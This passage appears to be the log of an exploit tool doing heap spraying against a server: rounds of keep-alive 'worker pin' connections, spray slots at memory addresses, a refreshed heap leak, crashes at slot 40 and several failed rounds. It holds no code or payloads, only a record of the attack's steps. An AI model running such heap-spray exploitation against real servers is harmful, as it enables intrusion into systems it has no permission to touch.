+18:34:33Z [#192] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:33Z [#193] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:33Z [#194] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:33Z [#195] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:33Z [#196] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:33Z [#197] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:33Z [#198] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:33Z [#199] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:33Z [#200] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:33Z [#201] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:34Z [#202] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:34Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:34Z [R-6 round 3] no slot; refreshing R-1 heap leak
+18:34:34Z [#203] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:34Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:34Z [#204] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:34Z [#205] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:34Z [#206] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:34Z [#207] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:34Z [#208] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:34Z [#209] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:34Z [#210] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:34Z [#211] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:34Z [#212] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:34Z [#213] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:34Z [#214] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:34Z [#215] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:34Z [#216] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:34Z [#217] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:34Z [#218] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:34Z [#219] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:34Z [#220] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:34Z [#221] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:34Z [#222] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:34Z [#223] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:34Z [#224] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:34Z [#225] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:34Z [#226] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:34Z [#227] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:34Z [#228] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:34Z [#229] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:34Z [#230] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:34Z [#231] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:34Z [#232] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:34Z [#233] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:34Z [#234] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:34Z [#235] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:34Z [#236] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:34Z [#237] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:34Z [#238] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:34Z [#239] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:34Z [#240] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:34Z [#241] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:34Z [#242] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:34Z [#243] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:34Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:34Z [R-6] FAILED round 3 (spray slot not found)
+18:34:34Z [R-6/R-7 round 4] opening fresh worker pin
+18:34:34Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:35Z [#244] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:35Z [#245] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:35Z [#246] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:35Z [#247] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:35Z [#248] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:35Z [#249] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:35Z [#250] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:35Z [#251] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:35Z [#252] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:35Z [#253] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:35Z [#254] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:35Z [#255] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:35Z [#256] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:35Z [#257] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:35Z [#258] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:35Z [#259] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:35Z [#260] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:35Z [#261] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:35Z [#262] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:35Z [#263] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:35Z [#264] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:35Z [#265] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:35Z [#266] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:35Z [#267] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:35Z [#268] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:35Z [#269] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:35Z [#270] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:35Z [#271] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:35Z [#272] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:35Z [#273] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:35Z [#274] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:35Z [#275] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:35Z [#276] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:35Z [#277] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:35Z [#278] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:35Z [#279] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:35Z [#280] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:35Z [#281] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:35Z [#282] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:35Z [#283] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:35Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:35Z [R-6 round 4] no slot; refreshing R-1 heap leak
+18:34:35Z [#284] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:35Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:35Z [#285] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:35Z [#286] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:35Z [#287] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:35Z [#288] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:35Z [#289] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:35Z [#290] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:35Z [#291] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:35Z [#292] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:35Z [#293] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:35Z [#294] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:35Z [#295] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:35Z [#296] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:35Z [#297] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:35Z [#298] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:35Z [#299] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:35Z [#300] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:35Z [#301] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:35Z [#302] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:35Z [#303] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:35Z [#304] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:35Z [#305] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:35Z [#306] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:35Z [#307] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:35Z [#308] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:35Z [#309] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:35Z [#310] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:35Z [#311] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:35Z [#312] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:35Z [#313] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:35Z [#314] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:35Z [#315] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:35Z [#316] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:35Z [#317] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:35Z [#318] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:35Z [#319] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:35Z [#320] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:35Z [#321] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:35Z [#322] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:35Z [#323] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:35Z [#324] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:35Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:35Z [R-6] FAILED round 4 (spray slot not found)
+18:34:35Z [R-6/R-7 round 5] opening fresh worker pin
+18:34:35Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:35Z [#325] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:35Z [#326] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:35Z [#327] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:35Z [#328] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:35Z [#329] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:35Z [#330] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:35Z [#331] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:35Z [#332] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:35Z [#333] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:35Z [#334] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:35Z [#335] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:35Z [#336] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:35Z [#337] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:35Z [#338] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:35Z [#339] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:35Z [#340] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:35Z [#341] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:35Z [#342] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:35Z [#343] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:35Z [#344] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:35Z [#345] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:35Z [#346] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:35Z [#347] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:35Z [#348] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:35Z [#349] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:35Z [#350] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:35Z [#351] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:35Z [#352] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:35Z [#353] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:35Z [#354] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:35Z [#355] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:35Z [#356] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:35Z [#357] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:35Z [#358] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:35Z [#359] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:35Z [#360] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:35Z [#361] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:35Z [#362] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:35Z [#363] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:36Z [#364] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:36Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:36Z [R-6 round 5] no slot; refreshing R-1 heap leak
+18:34:36Z [#365] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:36Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:36Z [#366] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:36Z [#367] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:36Z [#368] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:36Z [#369] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:36Z [#370] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:36Z [#371] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:36Z [#372] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:36Z [#373] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:36Z [#374] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:36Z [#375] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:36Z [#376] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:36Z [#377] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:36Z [#378] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:36Z [#379] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:36Z [#380] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:36Z [#381] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:36Z [#382] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:36Z [#383] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:36Z [#384] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:36Z [#385] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:36Z [#386] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:36Z [#387] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:36Z [#388] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:36Z [#389] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:36Z [#390] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:36Z [#391] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:36Z [#392] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:36Z [#393] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:36Z [#394] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:36Z [#395] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:36Z [#396] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:36Z [#397] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:36Z [#398] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:36Z [#399] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:36Z [#400] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:36Z [#401] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:36Z [#402] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:36Z [#403] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:36Z [#404] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:36Z [#405] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:37Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:37Z [R-6] FAILED round 5 (spray slot not found)
+18:34:37Z [R-6/R-7 round 6] opening fresh worker pin
+18:34:37Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:37Z [#406] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:34:37Z [#407] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:37Z [#408] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:37Z [#409] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:37Z [#410] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:37Z [#411] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:37Z [#412] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:37Z [#413] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:37Z [#414] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:37Z [#415] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:37Z [#416] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:37Z [#417] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:37Z [#418] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:37Z [#419] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:37Z [#420] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:37Z [#421] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:37Z [#422] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:37Z [#423] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:37Z [#424] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
